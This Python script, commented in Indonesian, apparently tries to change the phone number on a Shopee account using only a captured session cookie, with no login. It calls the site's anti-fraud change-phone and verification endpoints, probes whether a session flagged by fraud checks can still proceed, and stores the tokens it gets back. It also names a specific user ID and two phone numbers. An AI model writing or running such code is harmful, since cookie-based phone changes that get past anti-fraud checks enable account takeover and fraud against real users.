# -*- coding: utf-8 -*-
"""cp_direct.py — COBA change_phone LANGSUNG pakai cookie, tanpa login.

Cookie 1659 HIDUP (uid 16596703541, phone 6285136881948).
cart/mini = 90309999 tapi account/basic = 0.
Uji apakah change_phone_init_v2 juga 90309999 atau bisa lolos.

Kalau init_v2 = 0 -> flow bisa lanjut meski cart ter-flag.
"""
import json, sys, urllib.request, urllib.error, time

CKFILE = sys.argv[1] if len(sys.argv) > 1 else "ck_1659.txt"
NEWPHONE = sys.argv[2] if len(sys.argv) > 2 else "6283191104601"
USE_PROXY = len(sys.argv) > 3 and sys.argv[3] == "proxy"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36")
ck = open(CKFILE).read().strip()
# csrftoken ambil dari cookie
CSRF = ""
for p in ck.split(";"):
    if p.strip().startswith("csrftoken="):
        CSRF = p.split("=", 1)[1].strip()


def log(*a):
    print(*a, flush=True)


def call(path, body=None, method=None):
    url = "https://shopee.co.id" + path
    h = {"Cookie": ck, "User-Agent": UA, "X-API-SOURCE": "pc",
         "X-Requested-With": "XMLHttpRequest", "Referer": "https://shopee.co.id/",
         "Content-Type": "application/json", "Accept": "application/json",
         "X-CSRFToken": CSRF, "X-Shopee-Language": "id"}
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, headers=h,
                                 method=method or ("POST" if body is not None else "GET"))
    if USE_PROXY:
        op = urllib.request.build_opener(urllib.request.ProxyHandler({"https": "http://127.0.0.1:18080"}))
    else:
        op = urllib.request.build_opener()
    try:
        r = op.open(req, timeout=45)
        return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {}
    except Exception as e:
        return 0, {"exc": str(e)[:70]}


log(f"=== CP DIRECT — cookie={CKFILE} proxy={USE_PROXY} ===")
log(f"CSRF: {CSRF[:12]}...")

# 1. account info
s, j = call("/api/v4/account/basic/get_account_info")
d = j.get("data") or {}
log(f"\n[1] account: {s} err={j.get('error')} uid={d.get('userid')} phone={d.get('phone')}")

# 2. change_phone_init_v2
log("\n[2] change_phone_init_v2")
s, j = call("/api/v4/anti_fraud/change_phone_init_v2", {})
log(f"    {s} err={j.get('error')} data={str(j.get('data'))[:250]}")

if j.get("error") == 90309999:
    log("    ❌ 90309999 — sesi ter-flag")
else:
    d2 = j.get("data") or {}
    ut = d2.get("ivs_utoken")
    cpt = d2.get("change_phone_token")
    log(f"    change_phone_token: {(str(cpt)[:25]+'...') if cpt else None}")
    log(f"    ivs_utoken: {(str(ut)[:25]+'...') if ut else None}")

    # 3. ivs/methods
    if ut:
        log("\n[3] ivs/methods (event=2 ChangePhone)")
        s, j3 = call("/api/v4/anti_fraud/ivs/methods", {"event": 2, "u_token": ut})
        ms = j3.get("data") or []
        log(f"    {s} err={j3.get('error')} methods={[(m.get('type'),len(m.get('v_token') or '')) for m in ms]}")
        if ms:
            json.dump({"change_phone_token": cpt, "ivs_utoken": ut,
                       "methods": ms}, open("cp_state.json", "w"), indent=1)
            log("    -> cp_state.json")

# 4. precheck test
tip = None
try:
    tip = json.load(open("cp_tokens.json")).get("change_phone_token")
except Exception:
    pass
if tip:
    log("\n[4] change_phone_precheck_v2")
    s, j4 = call("/api/v4/anti_fraud/change_phone_precheck_v2",
                 {"new_phone": NEWPHONE, "change_phone_token": tip})
    log(f"    {s} err={j4.get('error')} data={str(j4.get('data'))[:200]}")

log("\n=== SELESAI ===")
